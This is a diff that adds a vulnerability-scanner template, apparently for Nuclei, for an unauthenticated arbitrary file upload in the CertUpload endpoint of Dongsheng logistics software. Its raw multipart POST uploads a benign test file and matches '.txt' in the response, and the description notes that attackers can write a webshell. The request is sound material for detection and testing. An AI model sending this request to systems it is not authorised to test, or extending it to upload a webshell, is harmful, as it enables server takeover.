@@ -1,0 +1,40 @@
+id: dswl-CertUpload-upload
+info:
+  name: Template Name
+  author: wangzong
+  severity: critical
+  description: 东胜物流软件是青岛东胜伟业软件有限公司一款集订单管理、仓库管理、运输管理等多种功能于一体的物流管理软件。由于东胜物流软件 CertUpload 接口处未对用户上传的文件进行合理的判断和过滤，导致存在文件上传漏洞，未经身份验证远程攻击者可利用该漏洞上传任意脚本文件，执行恶意代码，写入WebShell,进一步控制服务器权限。
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E4%B8%9C%E8%83%9C%E7%89%A9%E6%B5%81%E8%BD%AF%E4%BB%B6/%E4%B8%9C%E8%83%9C%E7%89%A9%E6%B5%81%E8%BD%AF%E4%BB%B6CertUpload%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
+  tags: tags
+http:
+  - raw:
+      - |
+        POST /MsWlTruck/CertUpload HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryTqkdY1lCvbvpmown
+        Content-Length: 445
+        Accept: */*
+        Accept-Encoding: gzip, deflate, br
+        Connection: keep-alive
+
+        ------WebKitFormBoundaryTqkdY1lCvbvpmown
+        Content-Disposition: form-data; name="file"; filename="test.txt"
+        Content-Type: image/jpeg
+
+        1111
+        ------WebKitFormBoundaryTqkdY1lCvbvpmown
+        Content-Disposition: form-data; name="TruckNo"
+
+        1
+        ------WebKitFormBoundaryTqkdY1lCvbvpmown
+        Content-Disposition: form-data; name="Cert_Type"
+
+        1
+        ------WebKitFormBoundaryTqkdY1lCvbvpmown--
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '.txt'
